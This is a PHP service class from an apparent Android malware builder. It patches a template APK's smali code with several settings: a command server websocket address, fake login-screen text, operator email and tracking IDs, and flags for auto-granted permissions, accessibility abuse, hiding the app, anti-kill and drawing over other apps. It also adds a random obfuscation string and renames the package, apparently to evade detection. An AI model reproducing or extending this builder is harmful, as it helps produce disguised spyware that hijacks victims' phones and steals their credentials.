<?php

declare(strict_types=1);

namespace App\Services\ApkBuilder;

use Illuminate\Support\Facades\File;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;

final class SmaliProcessor
{
    private string $buildDir;
    private string $obfuscationString;

    public function __construct(string $buildDir)
    {
        $this->buildDir = $buildDir;
        $this->obfuscationString = $this->generateObfuscationString();
    }

    private function generateObfuscationString(): string
    {
        $chars = 'qazwsxedcrfvtgbyhnujmikolp';
        $length = random_int(8, 16);
        $result = '';

        for ($i = 0; $i < $length; $i++) {
            $result .= $chars[random_int(0, strlen($chars) - 1)];
        }

        return $result;
    }

    public function modifyConfig(ApkBuildConfig $config, string $assetsKey, Encryptor $encryptor): void
    {
        $smaliPath = $this->buildDir . '/smali/com/icontrol/protector/My_Configs.smali';

        if (!File::exists($smaliPath)) {
            throw new \RuntimeException("My_Configs.smali not found at: {$smaliPath}");
        }

        $content = File::get($smaliPath);

        $parsedUrl = parse_url($config->websocketUrl);
        $host = $parsedUrl['host'] ?? 'localhost';
        $port = $parsedUrl['port'] ?? 8081;
        $userDom = $host . ':' . $port;
        $useWss = str_starts_with($config->websocketUrl, 'wss://');

        // 生成追踪数据字符串，格式: clientName>linkId>appId
        // linkId 使用 userId 作为唯一标识
        $trackingData = sprintf('%s>%s>%s', $config->clientName, $config->userId, $config->appId);

        $replacements = [
            '[Client_N]' => $config->clientName,
            '[_NOTIFI_TITLE_]' => $config->notifyTitle,
            '[_NOTIFI_MSG_]' => $config->notifyMsg,
            '[log-title]' => $config->loginTitle,
            '[log-dis]' => $config->loginDis,
            '[log-btn]' => $config->loginBtn,
            '[log-lng]' => $config->lngShort,
            '[USER_DOM]' => $userDom,
            '[USER_MAIL]' => $encryptor->encryptString($config->email),
            '[BSE_URL]' => $encryptor->encryptString($config->appUrl),
            '[USE-AUTOGRANT]' => $config->useAtoprims,
            '[USE-SUPER]' => $config->useAccess,
            '[USE-ALLPRIM]' => $config->userAllprims,
            '[USE-BLACK]' => $config->userBlackprims,
            '[USE-NOKILL]' => $config->useAntkill,
            '[USE-HIDDEEN]' => $config->hiddenApp,
            '[USE-FAKE]' => $config->hideType,
            '[USE-DRAWOVER]' => $config->useDraw,
            '[USE-OOENACC]' => $config->openAccess,
            '[USE-DIAO]' => $config->diaoType,
            '[USE-GUID]' => $config->installType,
            '[USE-STORE]' => $config->isStoreMode() ? '1' : '0',
            '[USE-CAPLOCK]' => '0',
            '[AST-PAS]' => $assetsKey,
            '[OBFS]' => $this->obfuscationString,
            '[NAME>LNK>ID!]' => $trackingData,  // 追踪数据占位符替换
        ];

        $content = str_replace(array_keys($replacements), array_values($replacements), $content);

        if (!$useWss) {
            $content = str_replace('const-string v1, "wss://"', 'const-string v1, "ws://"', $content);
        }

        File::put($smaliPath, $content);
    }

    public function renamePackage(string $oldPackage, string $newPackage): void
    {
        $oldPath = str_replace('.', '/', $oldPackage);
        $newPath = str_replace('.', '/', $newPackage);

        $smaliDirs = [
            'smali',
            'smali_classes2',
            'smali_classes3',
            'smali_classes4',
            'smali_classes5',
            'smali_classes6',
            'smali_classes7',
        ];

        foreach ($smaliDirs as $smaliDir) {
            $basePath = $this->buildDir . '/' . $smaliDir;

            if (!File::isDirectory($basePath)) {
                continue;
            }

            $oldDir = $basePath . '/' . $oldPath;
            $newDir = $basePath . '/' . $newPath;

            if (File::isDirectory($oldDir)) {
                File::ensureDirectoryExists(dirname($newDir));
                $this->moveDirectory($oldDir, $newDir);
                $this->replaceReferences($newDir, $oldPackage, $newPackage);
            }

            $this->replaceReferences($basePath, $oldPackage, $newPackage);
        }
    }

    private function moveDirectory(string $src, string $dst): void
    {
        if (!File::moveDirectory($src, $dst)) {
            File::copyDirectory($src, $dst);
            File::deleteDirectory($src);
        }
    }

    private function replaceReferences(string $dir, string $oldPackage, string $newPackage): void
    {
        $oldSmali = 'L' . str_replace('.', '/', $oldPackage);
        $newSmali = 'L' . str_replace('.', '/', $newPackage);

        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)
        );

        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getExtension() === 'smali') {
                $content = File::get($file->getPathname());
                $content = str_replace([$oldSmali, $oldPackage], [$newSmali, $newPackage], $content);
                File::put($file->getPathname(), $content);
            }
        }
    }
}
